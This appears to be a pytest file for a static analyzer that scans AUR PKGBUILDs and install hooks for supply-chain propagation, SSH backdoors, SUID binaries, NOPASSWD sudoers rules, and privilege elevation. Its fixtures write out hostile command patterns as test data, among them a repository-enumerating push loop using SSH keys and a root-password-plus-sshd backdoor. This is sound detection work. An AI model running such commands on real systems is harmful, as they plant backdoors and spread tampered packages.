    prefixes = ("env -i ", "/usr/bin/env ", "command -- ", "time -p ", "exec -- ")
    for prefix in prefixes:
        findings = analyze_text(
            f"{prefix}git remote add fixture ssh://aur@{AUR_HOST}/fixture.git\n"
            f"{prefix}git add PKGBUILD\n"
            f"{prefix}git push fixture main\n"
        )

        assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" in rule_ids(findings)


def test_quoted_arbitrary_heredoc_delimiters_remain_inert():
    for opener, closer in (("<<'END-DOC'", "END-DOC"), ('<<"END.DOC"', "END.DOC")):
        findings = analyze_text(
            f"cat {opener}\n"
            f"git remote add fixture ssh://aur@{AUR_HOST}/fixture.git\n"
            "git add PKGBUILD\n"
            "git push fixture main\n"
            f"{closer}\n"
        )

        assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" not in rule_ids(findings)


def test_unquoted_heredoc_command_substitutions_are_active():
    substitutions = (
        f"$(git remote add fixture ssh://aur@{AUR_HOST}/fixture.git; "
        "git add PKGBUILD; git push fixture main)",
        f"`git remote add fixture ssh://aur@{AUR_HOST}/fixture.git; "
        "git add PKGBUILD; git push fixture main`",
    )
    for substitution in substitutions:
        findings = analyze_text(f"cat <<EOF\n{substitution}\nEOF\n")

        assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" in rule_ids(findings)

    multiline = analyze_text(
        "cat <<EOF\n"
        "$(\n"
        f"git remote add fixture ssh://aur@{AUR_HOST}/fixture.git\n"
        "git add PKGBUILD\n"
        "git push fixture main\n"
        ")\n"
        "EOF\n"
    )
    assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" in rule_ids(multiline)


def test_arithmetic_and_double_bracket_shifts_do_not_start_heredocs():
    expressions = (
        "$((1 << shift))",
        "$[1 << shift]",
        "((value << 1))",
        "[[ value << marker ]]",
    )
    for expression in expressions:
        findings = analyze_text(
            expression
            + "\n"
            + f"git remote add fixture ssh://aur@{AUR_HOST}/fixture.git\n"
            + "git add PKGBUILD\n"
            + "git push fixture main\n"
        )

        assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" in rule_ids(findings)


def test_array_command_substitution_is_active_even_when_other_elements_are_inert():
    findings = analyze_text(
        "commands=(\n"
        "  harmless\n"
        f"  \"$(git remote add fixture ssh://aur@{AUR_HOST}/fixture.git; "
        "git add PKGBUILD; git push fixture main)\"\n"
        ")\n"
    )

    assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" in rule_ids(findings)


def test_aur_endpoint_variable_lookup_is_bounded_and_exact():
    assignments = "".join(
        f"remote_{index}='ssh://aur@{AUR_HOST}/fixture-{index}.git'\n"
        for index in range(512)
    )
    findings = analyze_text(
        assignments
        + 'git remote add fixture "$remote_511"\n'
        + "git add PKGBUILD\n"
        + "git push fixture main\n"
    )

    assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" in rule_ids(findings)


def test_optional_propagation_evidence_is_fixed_and_only_added_after_the_triad():
    content = (
        "find /tmp -type d -name .git\n"
        "for fixture_repo in /tmp/fixture-*; do\n"
        '  ssh-add "$HOME/.ssh/id_ed25519"\n'
        f"  git -C \"$fixture_repo\" remote set-url origin ssh://aur@{AUR_HOST}/fixture.git\n"
        '  git -C "$fixture_repo" add PKGBUILD\n'
        '  git -C "$fixture_repo" push origin main\n'
        "done\n"
    )
    findings = DeterministicAnalyzer().analyze_content(
        ".fixture.install",
        content,
        Phase.install_hook_static,
    )

    propagation = finding(findings, "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001")
    assert propagation.evidence_snippet == (
        "Correlated signals: AUR Git remote; repository content mutation; Git push; "
        "repository enumeration; repository iteration loop; SSH agent or key reference; "
        "dot-prefixed install hook"
    )
    assert AUR_HOST not in propagation.evidence_snippet
    assert "fixture_repo" not in propagation.evidence_snippet

    incomplete = DeterministicAnalyzer().analyze_content(
        ".fixture.install",
        "find /tmp -type d -name .git\nssh-add fixture-key\n",
        Phase.install_hook_static,
    )
    assert "SUPPLYCHAIN-AUR-REPO-PROPAGATION-001" not in rule_ids(incomplete)


def test_tailscale_service_or_status_alone_is_not_a_backdoor_match():
    findings = analyze_text(
        "systemctl enable tailscaled\n"
        "tailscale status\n"
    )

    assert "REMOTE-ADMIN-BACKDOOR-001" not in rule_ids(findings)


def test_disabled_tailscale_ssh_flag_is_not_a_remote_anchor():
    findings = analyze_text(
        "tailscale up --auth-key=fixture-only --ssh=false\n"
        "journalctl --vacuum-time=1s\n"
    )

    assert "REMOTE-ADMIN-BACKDOOR-001" not in rule_ids(findings)


def test_quoted_remote_access_examples_are_not_treated_as_commands():
    findings = analyze_text(
        "echo 'tailscale up --auth-key=fixture-only --ssh'\n"
        "printf 'journalctl --vacuum-time=1s\\n'\n"
        "echo if tailscale up --auth-key=fixture-only --ssh\n"
        "echo then journalctl --vacuum-time=1s\n"
    )

    assert "REMOTE-ADMIN-BACKDOOR-001" not in rule_ids(findings)


def test_quoted_ssh_config_or_disguised_name_without_path_is_not_remote_anchor():
    config_findings = analyze_text(
        'echo "Port 3333 PermitRootLogin yes"\n'
        "chmod 4755 /tmp/fixture-helper\n"
    )
    name_findings = analyze_text(
        'pkgdesc="mirrorlist-criteria"\n'
        "chmod 4755 /tmp/fixture-helper\n"
    )

    assert "REMOTE-ADMIN-BACKDOOR-001" not in rule_ids(config_findings)
    assert "REMOTE-ADMIN-BACKDOOR-001" not in rule_ids(name_findings)


def test_alternate_root_ssh_config_near_pacman_path_is_remote_anchor():
    findings = analyze_text(
        "cat > /etc/pacman.d/fixture-sshd <<'EOF'\n"
        "Port 3333\n"
        "PermitRootLogin yes\n"
        "EOF\n"
        "chmod 4755 /tmp/fixture-helper\n"
    )

    assert "REMOTE-ADMIN-BACKDOOR-001" in rule_ids(findings)


def test_remote_access_pair_scan_handles_adversarial_escaped_newlines():
    findings = analyze_text(
        "Port 3333 " + (r"\n" * 80) + " no-root-login\n"
        "OnCalendar=hourly " + (r"\n" * 80) + " no-root-user\n"
    )

    assert "REMOTE-ADMIN-BACKDOOR-001" not in rule_ids(findings)


def test_shell_quote_mask_handles_many_unclosed_command_substitutions():
    findings = analyze_text('echo "' + ("$(" * 10_000) + '\n')

    assert "REMOTE-ADMIN-BACKDOOR-001" not in rule_ids(findings)


def test_suid_and_sudoers_without_remote_anchor_are_not_called_a_backdoor():
    findings = analyze_text(
        'chmod 4755 "$target"\n'
        '%wheel ALL=(ALL) NOPASSWD: /usr/bin/fixture-helper\n'
    )

    assert "REMOTE-ADMIN-BACKDOOR-001" not in rule_ids(findings)


def test_numeric_suid_in_comment_does_not_block():
    findings = analyze_text("# chmod 4755 /usr/bin/fixture-helper\n")

    assert "SYS-CHMOD-001" not in rule_ids(findings)


def test_numeric_suid_in_quoted_documentation_does_not_block():
    findings = analyze_text('echo "chmod 4755 is unsafe"\n')

    assert "SYS-CHMOD-001" not in rule_ids(findings)


def test_sudoers_dropin_requires_review_and_nopasswd_blocks():
    dropin = analyze_text('install -Dm440 fixture "$pkgdir/etc/sudoers.d/fixture"\n')
    grant = analyze_text('%wheel ALL=(ALL) NOPASSWD: /usr/bin/fixture-helper\n')

    assert finding(dropin, "PRIV-SUDOERS-DROPIN-001").requires_manual_review is True
    assert finding(grant, "PRIV-SUDOERS-NOPASSWD-001").blocks_installation is True


def test_nopasswd_word_in_package_description_is_not_sudo_policy():
    findings = analyze_text('pkgdesc="Supports review of NOPASSWD: sudo policy"\n')

    assert "PRIV-SUDOERS-NOPASSWD-001" not in rule_ids(findings)


def test_numeric_suid_mode_is_blocked():
    findings = analyze_text('chmod 4755 "$target"\n')

    assert finding(findings, "SYS-CHMOD-001").blocks_installation is True


LITERAL_CREDENTIAL = "fixture-operator:fixture-only-password"
ACCOUNT_HOOK = Phase.install_hook_static


def test_literal_account_password_requires_review_but_does_not_block():
    findings = analyze_text(
        "post_install() {\n"
        "  /usr/bin/useradd -m -s /bin/bash fixture-operator\n"
        f"  echo '{LITERAL_CREDENTIAL}' | /usr/bin/chpasswd\n"
        "}\n",
        phase=ACCOUNT_HOOK,
    )

    credential = finding(findings, "PRIV-ACCOUNT-CREDENTIAL-001")
    assert credential.severity == Severity.HIGH
    assert credential.requires_manual_review is True
    assert credential.blocks_installation is False
    assert credential.line_number == 3
    assert "PRIV-ACCOUNT-BACKDOOR-001" not in rule_ids(findings)


def test_generated_account_password_is_not_a_literal_credential():
    findings = analyze_text(
        "post_install() {\n"
        '  printf "%s:%s\\n" "$fixture_user" "$(head -c 16 /dev/urandom)" | chpasswd\n'
        "  systemctl enable sshd\n"
        "}\n",
        phase=ACCOUNT_HOOK,
    )

    assert "PRIV-ACCOUNT-CREDENTIAL-001" not in rule_ids(findings)
    assert "PRIV-ACCOUNT-BACKDOOR-001" not in rule_ids(findings)


def test_quoted_password_examples_are_not_credential_assignments():
    findings = analyze_text(
        "post_install() {\n"
        "  echo \"Never run: echo 'svc:hardcoded' | chpasswd\"\n"
        "  echo \"Do not set PasswordAuthentication yes\"\n"
        "  echo \"See /etc/ssh/sshd_config for defaults\"\n"
        "  echo \"systemctl enable sshd is not performed here\"\n"
        "}\n",
        phase=ACCOUNT_HOOK,
    )

    assert "PRIV-ACCOUNT-CREDENTIAL-001" not in rule_ids(findings)
    assert "PRIV-ACCOUNT-BACKDOOR-001" not in rule_ids(findings)


def test_locked_system_account_is_not_a_credential_or_backdoor():
    findings = analyze_text(
        "post_install() {\n"
        "  /usr/bin/useradd --system --no-create-home --shell /usr/bin/nologin fixture-daemon || true\n"
        "  /usr/bin/passwd -l fixture-daemon || true\n"
        "}\n",
        phase=ACCOUNT_HOOK,
    )

    assert rule_ids(findings) == set()


def test_privileged_password_account_with_ssh_exposure_blocks():
    findings = analyze_text(
        "post_install() {\n"
        "  /usr/bin/useradd -m -G wheel -s /bin/bash fixture-operator\n"
        f"  echo '{LITERAL_CREDENTIAL}' | /usr/bin/chpasswd\n"
        "  /usr/bin/systemctl enable --now sshd\n"
        "}\n",
        phase=ACCOUNT_HOOK,
    )

    backdoor = finding(findings, "PRIV-ACCOUNT-BACKDOOR-001")
    assert backdoor.severity == Severity.CRITICAL
    assert backdoor.blocks_installation is True
    assert backdoor.requires_manual_review is False
    assert backdoor.line_number == 2
    assert LITERAL_CREDENTIAL not in backdoor.evidence_snippet
    assert backdoor.evidence_snippet.startswith("Correlated signals: ")


def test_root_password_assignment_with_ssh_start_blocks():
    findings = analyze_text(
        "post_install() {\n"
        "  echo 'root:fixture-only-password' | chpasswd\n"
        "  /usr/bin/systemctl restart sshd\n"
        "}\n",
        phase=ACCOUNT_HOOK,
    )

    backdoor = finding(findings, "PRIV-ACCOUNT-BACKDOOR-001")
    assert backdoor.blocks_installation is True
    assert "fixture-only-password" not in str(backdoor.evidence_snippet)


def test_account_password_without_ssh_exposure_is_not_a_remote_backdoor():
    findings = analyze_text(
        "post_install() {\n"
        "  /usr/bin/useradd -m -G wheel -s /bin/bash fixture-operator\n"
        f"  echo '{LITERAL_CREDENTIAL}' | /usr/bin/chpasswd\n"
        "}\n",
        phase=ACCOUNT_HOOK,
    )

    assert "PRIV-ACCOUNT-BACKDOOR-001" not in rule_ids(findings)
    assert "PRIV-ACCOUNT-CREDENTIAL-001" in rule_ids(findings)


def test_ssh_activation_without_account_credential_is_not_an_account_backdoor():
    findings = analyze_text(
        "post_install() {\n"
        "  /usr/bin/systemctl enable --now sshd\n"
        "  printf 'PasswordAuthentication yes\\n' >> /etc/ssh/sshd_config\n"
        "}\n",
        phase=ACCOUNT_HOOK,
    )

    assert "PRIV-ACCOUNT-BACKDOOR-001" not in rule_ids(findings)
    assert "PRIV-ACCOUNT-CREDENTIAL-001" not in rule_ids(findings)


def test_heredoc_chpasswd_body_is_a_literal_credential():
    findings = analyze_text(
        "post_install() {\n"
        "  chpasswd <<'FIXTURE'\n"
        f"{LITERAL_CREDENTIAL}\n"
        "FIXTURE\n"
        "}\n",
        phase=ACCOUNT_HOOK,
    )

    credential = finding(findings, "PRIV-ACCOUNT-CREDENTIAL-001")
    assert credential.line_number == 2
    assert LITERAL_CREDENTIAL not in str(credential.evidence_snippet)


def test_administrative_group_sudo_policy_requires_review_without_blocking():
    findings = analyze_text(
        'install -Dm440 fixture "$pkgdir/etc/sudoers.d/fixture"\n'
        "cat > /etc/sudoers.d/fixture <<'EOF'\n"
        "%wheel ALL=(ALL:ALL) ALL\n"
        "EOF\n",
    )

    policy = finding(findings, "PRIV-SUDO-ADMIN-GROUP-001")
    assert policy.severity == Severity.HIGH
    assert policy.requires_manual_review is True
    assert policy.blocks_installation is False
    assert policy.line_number == 3
    assert "%wheel" not in policy.evidence_snippet


def test_passwordless_administrative_group_policy_stays_the_blocking_rule():
    findings = analyze_text("%wheel ALL=(ALL) NOPASSWD: /usr/bin/fixture-helper\n")

    assert finding(findings, "PRIV-SUDOERS-NOPASSWD-001").blocks_installation is True
    assert "PRIV-SUDO-ADMIN-GROUP-001" not in rule_ids(findings)


def test_wheel_policy_word_in_package_description_is_not_a_policy_change():
    findings = analyze_text('pkgdesc="Installs %wheel ALL=(ALL:ALL) ALL sample policy"\n')

    assert "PRIV-SUDO-ADMIN-GROUP-001" not in rule_ids(findings)


BUILD_ELEVATION = "PRIV-BUILD-PRIVILEGE-ELEVATION-001"


@pytest.mark.parametrize("command", ["sudo", "doas", "pkexec", "su", "run0"])
def test_build_phase_privilege_elevation_is_blocked(command):
    findings = analyze_text(
        f"build() {{\n  {command} true\n}}\n",
    )

    elevation = finding(findings, BUILD_ELEVATION)
    assert elevation.severity == Severity.CRITICAL
    assert elevation.blocks_installation is True
    assert elevation.requires_manual_review is False
    assert elevation.phase == Phase.pkgbuild_static
    assert elevation.line_number == 2
    # Evidence must stay secret-free and must not echo the command arguments.
    assert elevation.evidence_snippet == "build logic invokes a privilege-elevation command"


@pytest.mark.parametrize("command", ["doas", "pkexec", "su", "run0"])
def test_install_hook_non_sudo_elevation_is_blocked(command):
    findings = analyze_text(
        f"post_install() {{\n  {command} true\n}}\n",
        Phase.install_hook_static,
    )

    elevation = finding(findings, BUILD_ELEVATION)
    assert elevation.phase == Phase.install_hook_static
    assert elevation.blocks_installation is True
    # sudo keeps its own install-hook rule, so the family rule must not double.
    assert "EXEC-INSTALL-HOOK-SUDO-001" not in rule_ids(findings)


def test_install_hook_sudo_keeps_its_dedicated_rule():
    findings = analyze_text(
        "post_install() {\n  sudo -n true\n}\n",
        Phase.install_hook_static,
    )

    assert "EXEC-INSTALL-HOOK-SUDO-001" in rule_ids(findings)
    assert BUILD_ELEVATION not in rule_ids(findings)


def test_build_sudo_with_explicit_non_root_user_is_not_blocked():
    findings = analyze_text("build() {\n  sudo -u fixture-builder make install\n}\n")

    assert BUILD_ELEVATION not in rule_ids(findings)
    assert "EXEC-INSTALL-HOOK-SUDO-001" not in rule_ids(findings)


def test_build_elevation_written_as_arguments_or_messages_is_not_a_command():
    inert = (
        "build() {\n  echo sudo make install\n}\n",
        "build() {\n  printf 'doas make\\n'\n}\n",
        "build() {\n  # su -c 'make install'\n}\n",
        'build() {\n  commands=(pkexec true)\n}\n',
        "build() {\n  msg=\"run su -c make\"\n}\n",
    )
    for content in inert:
        assert BUILD_ELEVATION not in rule_ids(analyze_text(content))


def test_ordinary_build_steps_are_not_privilege_elevation():
    findings = analyze_text(
        "build() {\n"
        "  make\n"
        "  cmake -B build\n"
        "  install -Dm644 fixture \"$pkgdir/usr/share/fixture\"\n"
        "  ./configure --prefix=/usr\n"
        "}\n",
    )

    assert BUILD_ELEVATION not in rule_ids(findings)


def test_build_elevation_inside_command_substitution_is_blocked():
    findings = analyze_text('build() {\n  version="$(sudo fixture-helper --version)"\n}\n')

    assert BUILD_ELEVATION in rule_ids(findings)
